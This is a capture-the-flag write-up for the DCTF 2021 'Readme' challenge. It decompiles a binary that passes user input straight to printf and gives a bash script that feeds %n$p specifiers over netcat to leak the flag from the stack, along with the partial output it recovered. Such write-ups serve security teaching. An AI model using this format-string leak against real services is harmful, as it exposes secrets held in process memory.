# DCTF 2021

## Readme

> 150
> 
> Read me to get the flag. 
> 
> `nc dctf-chall-readme.westeurope.azurecontainer.io 7481`
>
> [readme](readme)

Tags: _pwn_ _x86-64_ _format-string_


## Summary

Classic leak the flag from the stack with `%p`.

## Analysis

### Decompile with Ghidra

```c
void vuln(void)
{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_58 [32];
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __stream = fopen("flag.txt","r");
  fgets(local_58,0x1c,__stream);
  fclose(__stream);
  puts("hello, what\'s your name?");
  fgets(local_38,0x1e,stdin);
  printf("hello ");
  printf(local_38);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}
```

The `vuln` function reads `flag.txt` into a local (`local_58`) stack array.

The vulnerability is the `printf(local_38)` statement that is missing a format string.  Exfiltrating the flag is as simple as passing `%nn$p` format strings where `nn` is the position in the stack; starting from `6` just increment until the output starts with `dctf` (`nn` = `8`), then continue until you have the flag.

If you're new to format-string exploits read this: [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf).

## Exploit

```bash
#!/bin/bash

for((p=8;p<14;p++)) {
    echo '%'$p'$p' | \
    nc dctf-chall-readme.westeurope.azurecontainer.io 7481 | \
    grep 'hello ' | \
    awk -Fx '{print $NF}' | \
    xxd -r -p | \
    rev
}
```

This `bash` script will `echo %8$p`, then `echo %9$p`, etc... into the challenge service serially (one by one), capturing the output (`grep`, `awk`), converting to text (`xxd`), and then finally reversing the string (`rev`, since x86_64 is little endian).

Output:

```bash
# ./exploit.sh
dctf{n0w_g0_r3ad_s0me_b0
rev: stdin: Invalid or incomplete multibyte or wide character
rev: stdin: Invalid or incomplete multibyte or wide character
```

Yeah, so the input string corrupting stack?  Didn't really look that hard into the problem, just guessed the `0k5` at the end. 
